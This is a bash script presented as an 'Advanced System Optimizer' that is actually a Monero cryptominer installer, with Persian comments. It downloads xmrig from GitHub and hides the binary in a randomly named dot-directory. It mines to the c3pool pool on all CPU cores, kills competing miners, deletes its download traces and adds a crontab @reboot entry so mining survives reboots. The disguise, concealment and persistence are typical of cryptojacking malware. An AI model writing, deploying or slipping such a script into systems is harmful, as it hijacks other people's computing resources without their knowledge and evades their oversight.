#!/bin/bash
VERSION=2.26
echo "Advanced System Optimizer v$VERSION"
echo "100% NO-ROOT, NO-ERROR, ALL CORES @ 85%"
echo
export LC_ALL=C
export LANG=C

# --- کاربر واقعی ---
REAL_USER="${SUDO_USER:-$(whoami)}"
REAL_HOME="$(getent passwd "$REAL_USER" | cut -d: -f6 2>/dev/null || echo "$HOME")"
[ -z "$REAL_HOME" ] && REAL_HOME="$HOME"

WALLET="$1"
if [ -z "$WALLET" ]; then
    echo "Usage: $0 <wallet_address>"
    exit 1
fi

# --- پیش‌نیازها ---
if ! command -v curl >/dev/null || ! command -v tar >/dev/null; then
    echo "[*] curl or tar missing. Install manually."
    exit 1
fi

# --- هسته‌ها ---
CPU_TOTAL=$(nproc)
USABLE_THREADS=$CPU_TOTAL
[ $USABLE_THREADS -lt 1 ] && USABLE_THREADS=1
CPU_HINT=85

echo "[*] Using $USABLE_THREADS threads @ $CPU_HINT% each"

# --- ساخت $HOME/.local اگر وجود نداشت ---
LOCAL_DIR="$REAL_HOME/.local"
if [ ! -d "$LOCAL_DIR" ]; then
    mkdir -p "$LOCAL_DIR" 2>/dev/null || { echo "ERROR: Cannot create $LOCAL_DIR"; exit 1; }
    chmod 700 "$LOCAL_DIR" 2>/dev/null
fi

# --- نام تصادفی ---
RAND_HEX=$(openssl rand -hex 16 2>/dev/null || date +%s%N | sha256sum | head -c 16)

# --- مسیر اصلی ---
BASE_DIR="$LOCAL_DIR/.$RAND_HEX"
LOG_DIR="$BASE_DIR/.log"
CFG_DIR="$BASE_DIR/.cfg"

# --- ساخت پوشه با چک دقیق ---
if ! mkdir -p "$BASE_DIR" 2>/dev/null; then
    # fallback به /tmp
    BASE_DIR="/tmp/.$REAL_USER.$RAND_HEX"
    LOG_DIR="$BASE_DIR/.log"
    CFG_DIR="$BASE_DIR/.cfg"
    mkdir -p "$BASE_DIR" "$LOG_DIR" "$CFG_DIR" 2>/dev/null || { echo "ERROR: Cannot create any directory"; exit 1; }
else
    mkdir -p "$LOG_DIR" "$CFG_DIR" 2>/dev/null || { echo "ERROR: Cannot create subdirs"; exit 1; }
fi

if [ ! -w "$BASE_DIR" ]; then
    echo "ERROR: $BASE_DIR not writable"
    exit 1
fi

chmod 700 "$BASE_DIR" "$LOG_DIR" "$CFG_DIR" 2>/dev/null

echo "[*] Installing in: $BASE_DIR"

# --- پاک‌سازی قبلی ---
pkill -f "xmrig" 2>/dev/null
pkill -f "$BASE_DIR/main" 2>/dev/null
find "$LOCAL_DIR" /tmp -name ".${RAND_HEX}*" -type d -exec rm -rf {} + 2>/dev/null

# --- MSR فقط root ---
if [ "$(id -u)" -eq 0 ]; then
    modprobe msr 2>/dev/null || true
    sysctl -w vm.nr_hugepages=4096 >/dev/null 2>&1 || true
fi

# --- دانلود ---
URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"
TMP_TAR="/tmp/.tmp_$(date +%s).tgz"

curl -fsSL "$URL" -o "$TMP_TAR" || { echo "ERROR: Download failed"; exit 1; }

tar xzf "$TMP_TAR" -C /tmp/ 2>/dev/null || { echo "ERROR: Extract failed"; rm -f "$TMP_TAR"; exit 1; }

XMRIG_BIN=$(find /tmp -name "xmrig" -type f -executable 2>/dev/null | head -1)
[ -z "$XMRIG_BIN" ] && { echo "ERROR: xmrig not found"; rm -f "$TMP_TAR"; exit 1; }

# --- کپی با چک ---
if ! cp "$XMRIG_BIN" "$BASE_DIR/main"; then
    echo "ERROR: Copy failed (permission?)"
    rm -rf "$BASE_DIR"
    exit 1
fi

chmod +x "$BASE_DIR/main"
rm -f "$TMP_TAR"
find /tmp -name "xmrig*" -type d -exec rm -rf {} + 2>/dev/null

# --- config.json ---
cat > "$BASE_DIR/config.json" << EOF
{
    "api": { "id": null, "worker-id": "$REAL_USER" },
    "http": { "enabled": false },
    "autosave": true,
    "background": true,
    "randomx": {
        "init": $USABLE_THREADS,
        "mode": "fast",
        "1gb-pages": false,
        "rdmsr": $([ "$(id -u)" -eq 0 ] && echo true || echo false),
        "wrmsr": $([ "$(id -u)" -eq 0 ] && echo true || echo false),
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": $([ "$(id -u)" -eq 0 ] && echo true || echo false),
        "hw-aes": true,
        "rx/0": [true],
        "threads": $USABLE_THREADS
    },
    "pools": [{
        "algo": "rx/0",
        "url": "auto.c3pool.org:19999",
        "user": "$WALLET",
        "pass": "x",
        "rig-id": "$REAL_USER",
        "keepalive": true,
        "enabled": true,
        "tls": false
    }],
    "print-time": 60,
    "retries": 5,
    "retry-pause": 5
}
EOF

# --- control ---
cat > "$BASE_DIR/control" << 'EOF'
#!/bin/bash
cd "$(dirname "$0")" || exit 1
case "$1" in
    start)
        pgrep -f "./main" >/dev/null && { echo "Already running"; exit 0; }
        nohup ./main --config=config.json --cpu-max-threads-hint=85 > .log/output.log 2>&1 &
        echo $! > .pid
        sleep 3
        echo "Started"
        ;;
    stop)
        pkill -f "./main" 2>/dev/null
        [ -f .pid ] && kill $(cat .pid) 2>/dev/null && rm -f .pid 2>/dev/null
        echo "Stopped"
        ;;
    status)
        if pgrep -f "./main" >/dev/null; then
            echo "Running (PID: $(pgrep -f "./main"))"
        else
            echo "Stopped"
        fi
        ;;
    logs) tail -20 .log/output.log 2>/dev/null || echo "No logs" ;;
    *) echo "Usage: $0 {start|stop|status|logs}" ;;
esac
EOF
chmod +x "$BASE_DIR/control"

# --- crontab ---
(crontab -l 2>/dev/null | grep -vF "$BASE_DIR"; echo "@reboot sleep 90 && $BASE_DIR/control start >/dev/null 2>&1") | crontab -

# --- استارت ---
"$BASE_DIR/control" start

sleep 15
echo
echo "=== STATUS ==="
"$BASE_DIR/control" status
echo
echo "SUCCESS! Miner is running"
echo "Path: $BASE_DIR"
echo "Control: $BASE_DIR/control status"
echo "All $USABLE_THREADS cores @ 85%"

exit 0
